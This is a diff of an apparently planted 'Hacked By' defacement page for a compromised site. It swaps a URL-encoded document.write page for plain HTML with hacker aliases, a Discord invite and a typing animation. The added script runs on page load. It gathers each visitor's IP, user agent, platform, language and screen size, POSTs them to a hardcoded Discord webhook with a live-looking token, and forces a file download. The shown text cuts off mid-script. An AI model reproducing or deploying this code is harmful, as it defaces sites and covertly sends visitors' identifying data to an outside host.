@@ -1,1 +1,303 @@
-<script language=javascript>document.write(unescape('%3C%21DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%20%20%20%20%3Ctitle%3EHacked%20By%20@m2%3C/title%3E%0A%20%20%20%20%3Clink%20href%3D%22https%3A//fonts.googleapis.com/css2%3Ffamily%3DMajor+Mono+Display%26display%3Dswap%22%20rel%3D%22stylesheet%22%3E%0A%20%20%20%20%3Cstyle%3E%0A%20%20%20%20%20%20%20%20body%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20background%3A%20%23000%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20flex-direction%3A%20column%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A%20100vh%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-family%3A%20Arial%2C%20sans-serif%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20overflow%3A%20hidden%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20.hacker-text%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23808080%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20text-shadow%3A%20none%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin%3A%2015px%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20animation%3A%20colorChange%203s%20infinite%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20@keyframes%20colorChange%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%200%25%20%7B%20color%3A%20%23808080%3B%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%2050%25%20%7B%20color%3A%20%23404040%3B%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20100%25%20%7B%20color%3A%20%23808080%3B%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20.hacker-title%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%203.5rem%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-weight%3A%20normal%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20letter-spacing%3A%20-3px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-bottom%3A%2010px%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20.hacker-subtitle%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%201.8rem%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20opacity%3A%200.9%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20.hacker-frame%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20width%3A%20500px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A%20500px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin%3A%200%20auto%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border%3A%20none%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20box-shadow%3A%20none%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20background%3A%20%23000%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20position%3A%20relative%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20overflow%3A%20hidden%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20.hacker-frame%20iframe%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A%20100%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border%3A%20none%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20object-fit%3A%20cover%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20block%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%23ip-display%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23606060%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%201.2rem%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-top%3A%2010px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20animation%3A%20colorChange%203s%20infinite%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20position%3A%20fixed%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20bottom%3A%2040px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20left%3A%2050%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20transform%3A%20translateX%28-50%25%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20@media%20%28max-width%3A%20768px%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20.hacker-title%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%202rem%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20.hacker-subtitle%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%201.2rem%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20.hacker-frame%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20width%3A%20300px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20height%3A%20300px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.typing-container%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-bottom%3A%2030px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-family%3A%20%27Courier%20New%27%2C%20monospace%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20text-align%3A%20left%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20max-width%3A%20600px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%2020px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20position%3A%20fixed%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20top%3A%2020px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20left%3A%2020px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20z-index%3A%201000%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.typing-text%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20none%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin%3A%205px%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%201.5rem%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20white-space%3A%20pre-line%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23fff%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20text-align%3A%20left%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.typing-text%20span.red%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23ff0000%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20content%3A%20%22abo%20sb3h%22%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.name-animation%3A%3Aafter%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20content%3A%20%22abo%20sb3h%22%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20animation%3A%20nameChange%206s%20infinite%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20@keyframes%20nameChange%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%200%25%2C%2032%25%20%7B%20content%3A%20%22abo%20sb3h%22%3B%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%2033%25%2C%2065%25%20%7B%20content%3A%20%22%u041D%u0430%u0438%u0444%22%3B%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%2066%25%2C%20100%25%20%7B%20content%3A%20%22Sasha%22%3B%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.main-content%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20none%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20opacity%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20transition%3A%20opacity%201s%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.main-content.show%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20block%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20opacity%3A%201%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.cursor%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20animation%3A%20blink%200.7s%20infinite%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20@keyframes%20blink%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%200%25%20%7B%20opacity%3A%200%3B%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%2050%25%20%7B%20opacity%3A%201%3B%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20100%25%20%7B%20opacity%3A%200%3B%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%3C/style%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%20%20%20%20%3Cdiv%20class%3D%22typing-container%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22typing-text%22%3E%5B+%5D%20%3Cspan%20class%3D%22red%22%3Eabo%20sb3h%3C/span%3E%20Is%20Now%20Into%20Your%20Server%20...%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22typing-text%22%3E%5B+%5D%20Dear%20Eagle%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22typing-text%22%3E%5B+%5D%20Your%20Security%20Is%20So%20SLow%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22typing-text%22%3E%5B+%5D%20%3Cspan%20class%3D%22red%22%3Eabo%20sb3h%3C/span%3E%20%5B+%5D%3C/div%3E%0A%20%20%20%20%3C/div%3E%0A%0A%20%20%20%20%3Cdiv%20class%3D%22main-content%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22hacker-frame%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Ciframe%20src%3D%22https%3A//g.top4top.io/p_3381vbxy41.gif%22%20style%3D%22width%3A100%25%3Bheight%3A100%25%3Bborder%3Anone%3B%22%20allowfullscreen%3E%3C/iframe%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22hacker-text%20hacker-title%22%3EHacked%20By%20%3Cspan%20class%3D%22name-animation%22%3E%3C/span%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22hacker-text%20hacker-subtitle%22%3Ediscord.gg/ozz%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22ip-display%22%3E%3C/div%3E%0A%20%20%20%20%3C/div%3E%0A%0A%20%20%20%20%3Caudio%20id%3D%22keyboard-sound-1%22%20src%3D%22https%3A//www.fesliyanstudios.com/play-mp3/6%22%20preload%3D%22auto%22%3E%3C/audio%3E%0A%20%20%20%20%3Caudio%20id%3D%22keyboard-sound-2%22%20src%3D%22https%3A//www.fesliyanstudios.com/play-mp3/5%22%20preload%3D%22auto%22%3E%3C/audio%3E%0A%20%20%20%20%3Caudio%20id%3D%22keyboard-sound-3%22%20src%3D%22https%3A//www.fesliyanstudios.com/play-mp3/4%22%20preload%3D%22auto%22%3E%3C/audio%3E%0A%20%20%20%20%3Caudio%20id%3D%22background-music%22%20src%3D%22https%3A//b.top4top.io/m_338179mjy1.mp3%22%20preload%3D%22auto%22%3E%3C/audio%3E%0A%0A%20%20%20%20%3Cscript%3E%0A%20%20%20%20%20%20%20%20//%20IP%20fetching%20code%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A//api.ipify.org%3Fformat%3Djson%27%29%0A%20%20%20%20%20%20%20%20%20%20%20%20.then%28response%20%3D%3E%20response.json%28%29%29%0A%20%20%20%20%20%20%20%20%20%20%20%20.then%28data%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%27ip-display%27%29.textContent%20%3D%20%27Your%20IP%3A%20%27%20+%20data.ip%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%0A%20%20%20%20%20%20%20%20%20%20%20%20.catch%28error%20%3D%3E%20console.error%28%27Error%20fetching%20IP%3A%27%2C%20error%29%29%3B%0A%0A%20%20%20%20%20%20%20%20//%20Typing%20animation%0A%20%20%20%20%20%20%20%20document.addEventListener%28%27DOMContentLoaded%27%2C%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20texts%20%3D%20document.querySelectorAll%28%27.typing-text%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20keyboardSounds%20%3D%20%5B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%27keyboard-sound-1%27%29%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%27keyboard-sound-2%27%29%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%27keyboard-sound-3%27%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%5D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20backgroundMusic%20%3D%20document.getElementById%28%27background-music%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20mainContent%20%3D%20document.querySelector%28%27.main-content%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20let%20currentIndex%20%3D%200%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20function%20getRandomInt%28min%2C%20max%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20Math.floor%28Math.random%28%29%20*%20%28max%20-%20min%20+%201%29%29%20+%20min%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20function%20typeText%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28currentIndex%20%3E%3D%20texts.length%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20setTimeout%28%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20texts.forEach%28text%20%3D%3E%20text.style.display%20%3D%20%27none%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20setTimeout%28%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20mainContent.classList.add%28%27show%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20backgroundMusic.volume%20%3D%200.5%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20backgroundMusic.play%28%29.catch%28e%20%3D%3E%20console.log%28%27Music%20play%20error%3A%27%2C%20e%29%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%20500%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%20800%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20currentText%20%3D%20texts%5BcurrentIndex%5D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20currentText.style.display%20%3D%20%27block%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20let%20charIndex%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20text%20%3D%20currentText.innerHTML%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20currentText.textContent%20%3D%20%27%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20function%20type%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28charIndex%20%3C%20text.length%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28text.slice%28charIndex%29.startsWith%28%27%3Cspan%20class%3D%22red%22%3E%27%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20endIndex%20%3D%20text.indexOf%28%27%3C/span%3E%27%2C%20charIndex%29%20+%207%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20currentText.innerHTML%20+%3D%20text.slice%28charIndex%2C%20endIndex%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20charIndex%20%3D%20endIndex%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20currentText.innerHTML%20+%3D%20text%5BcharIndex%5D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20charIndex++%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20Play%20random%20keyboard%20sound%20for%20visible%20characters%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28text%5BcharIndex%20-%201%5D%20%21%3D%3D%20%27%20%27%20%26%26%20text%5BcharIndex%20-%201%5D%20%21%3D%3D%20%27%5Cn%27%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20sound%20%3D%20keyboardSounds%5BgetRandomInt%280%2C%202%29%5D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sound.currentTime%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sound.volume%20%3D%200.4%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sound.playbackRate%20%3D%20getRandomInt%288%2C%2012%29%20/%2010%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sound.play%28%29.catch%28e%20%3D%3E%20console.log%28%27Sound%20play%20error%3A%27%2C%20e%29%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20setTimeout%28type%2C%20getRandomInt%2830%2C%20100%29%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20currentIndex++%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20setTimeout%28typeText%2C%20getRandomInt%28200%2C%20600%29%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20type%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20typeText%28%29%3B%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%3C/script%3E%0A%3C/body%3E%0A%3C/html%3E'))</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacked By @m2</title>
+    <style>
+        body {
+            background: #000;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+        }
+        .typing-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+            color: #808080;
+            font-family: 'Courier New', monospace;
+            font-size: 1.2rem;
+            text-align: right;
+            display: none;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 15px;
+            border-radius: 5px;
+            border: 1px solid #333;
+        }
+        .typing-text {
+            margin: 5px 0;
+            white-space: nowrap;
+            opacity: 0;
+            transform: translateX(20px);
+            transition: opacity 0.3s, transform 0.3s;
+        }
+        .typing-text.visible {
+            opacity: 1;
+            transform: translateX(0);
+        }
+        .typing-text .red {
+            color: #ff0000;
+            text-shadow: 0 0 5px rgba(255, 0, 0, 0.5);
+        }
+        .cursor {
+            display: inline-block;
+            width: 8px;
+            height: 1.2em;
+            background: #808080;
+            margin-left: 5px;
+            animation: blink 0.8s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 0; }
+            50% { opacity: 1; }
+        }
+        .main-content {
+            display: none;
+            opacity: 0;
+            transition: opacity 1s;
+        }
+        .main-content.show {
+            opacity: 1;
+        }
+        .hacker-text {
+            color: #808080;
+            text-shadow: 0 0 5px rgba(128, 128, 128, 0.5);
+            text-align: center;
+            margin: 15px 0;
+            animation: colorChange 3s infinite;
+        }
+        @keyframes colorChange {
+            0% { color: #808080; text-shadow: 0 0 5px rgba(128, 128, 128, 0.5); }
+            50% { color: #404040; text-shadow: 0 0 5px rgba(64, 64, 64, 0.5); }
+            100% { color: #808080; text-shadow: 0 0 5px rgba(128, 128, 128, 0.5); }
+        }
+        .hacker-title {
+            font-size: 3.5rem;
+            font-weight: normal;
+            letter-spacing: -3px;
+            margin-bottom: 10px;
+        }
+        .hacker-subtitle {
+            font-size: 1.8rem;
+            opacity: 0.9;
+        }
+        .hacker-frame {
+            width: 500px;
+            height: 500px;
+            margin: 0 auto;
+            border: none;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            background: #000;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 5px;
+        }
+        .hacker-frame iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            object-fit: cover;
+            display: block;
+        }
+        #ip-display {
+            color: #606060;
+            font-size: 1.2rem;
+            margin-top: 10px;
+            animation: colorChange 3s infinite;
+            position: fixed;
+            bottom: 40px;
+            left: 50%;
+            transform: translateX(-50%);
+            text-shadow: 0 0 5px rgba(96, 96, 96, 0.5);
+        }
+        .name-animation::after {
+            content: "abosb3h";
+            animation: nameChange 16s infinite;
+            color: #b8860b;
+            text-shadow: 0 0 5px rgba(184, 134, 11, 0.5);
+        }
+        @keyframes nameChange {
+            0%, 11% { content: "abosb3h"; color: #b8860b; text-shadow: 0 0 5px rgba(184, 134, 11, 0.5); }
+            12.5%, 23.5% { content: "sylx.com"; color: #ffffff; text-shadow: 0 0 5px rgba(255, 255, 255, 0.5); }
+            25%, 36% { content: "Nazi"; color: #ffffff; text-shadow: 0 0 5px rgba(255, 255, 255, 0.5); }
+            37.5%, 48.5% { content: "! SAYONARA"; color: #ffffff; text-shadow: 0 0 5px rgba(255, 255, 255, 0.5); }
+            50%, 61% { content: "0kkq"; color: #ffffff; text-shadow: 0 0 5px rgba(255, 255, 255, 0.5); }
+            62.5%, 73.5% { content: "Sasha"; color: #ffffff; text-shadow: 0 0 5px rgba(255, 255, 255, 0.5); }
+            75%, 86% { content: "Наиф"; color: #ffffff; text-shadow: 0 0 5px rgba(255, 255, 255, 0.5); }
+            87.5%, 98.5% { content: "3ta"; color: #ffffff; text-shadow: 0 0 5px rgba(255, 255, 255, 0.5); }
+            99%, 100% { content: "marco"; color: #ffffff; text-shadow: 0 0 5px rgba(255, 255, 255, 0.5); }
+        }
+    </style>
+</head>
+<body>
+    <div class="typing-container">
+        <div class="typing-text">[+] <span class="red">abo sb3h</span> Is Now Into Your Server ...<span class="cursor"></span></div>
+        <div class="typing-text">[+] Dear Eagle<span class="cursor"></span></div>
+        <div class="typing-text">[+] Your Security Is So SLow<span class="cursor"></span></div>
+        <div class="typing-text">[+] <span class="red">abo sb3h</span> [+]<span class="cursor"></span></div>
+    </div>
+
+    <div class="main-content">
+        <div class="hacker-frame">
+            <iframe src="https://l.top4top.io/p_33815vdwg1.gif" style="width:100%;height:100%;border:none;" allowfullscreen></iframe>
+        </div>
+        <div class="hacker-text hacker-title">Hacked By <span class="name-animation"></span></div>
+        <div class="hacker-text hacker-subtitle">discord.gg/ozz</div>
+        <div id="ip-display"></div>
+    </div>
+
+    <!-- Audio elements -->
+    <audio id="keyboard-sound-1" src="https://www.fesliyanstudios.com/play-mp3/6" preload="auto"></audio>
+    <audio id="keyboard-sound-2" src="https://www.fesliyanstudios.com/play-mp3/5" preload="auto"></audio>
+    <audio id="keyboard-sound-3" src="https://www.fesliyanstudios.com/play-mp3/4" preload="auto"></audio>
+    <audio id="background-music" src="https://i.top4top.io/m_3381hrn5h1.mp3" preload="auto" loop></audio>
+
+    <script>
+        // Discord webhook URL
+        const webhookUrl = 'https://discord.com/api/webhooks/1357864679405523164/QxQY3ETmjuXzc82pfUz8le4Gn4bOXsH-rPxg-BcnSlCgAY-epPKDr-Uaah_oXg5mM01D';
+
+        // Function to get user information and send to Discord
+        async function getUserInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
+                const screenResolution = `${window.screen.width}x${window.screen.height}`;
+                
+                // Create and download 503.txt
+                const content = "503 here";
+                const blob = new Blob([content], { type: 'text/plain' });
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(blob);
+                a.download = '503.txt';
+                a.click();
+                
+                const embed = {
+                    title: "New Visitor Information",
+                    color: 16711680,
+                    fields: [
+                        {
+                            name: "IP Address",
+                            value: ipData.ip,
+                            inline: true
+                        },
+                        {
+                            name: "User Agent",
+                            value: userAgent,
+                            inline: false
+                        },
+                        {
+                            name: "Platform",
+                            value: platform,
+                            inline: true
+                        },
+                        {
+                            name: "Language",
+                            value: language,
+                            inline: true
+                        },
+                        {
+                            name: "Screen Resolution",
+                            value: screenResolution,
+                            inline: true
+                        }
+                    ],
+                    timestamp: new Date().toISOString()
+                };
+
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        embeds: [embed]
+                    })
+                });
+
+                document.getElementById('ip-display').textContent = 'Your IP: ' + ipData.ip;
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        // Typing animation function
+        function typeText() {
+            const typingContainer = document.querySelector('.typing-container');
+            const mainContent = document.querySelector('.main-content');
+            const texts = document.querySelectorAll('.typing-text');
+            const keyboardSounds = [
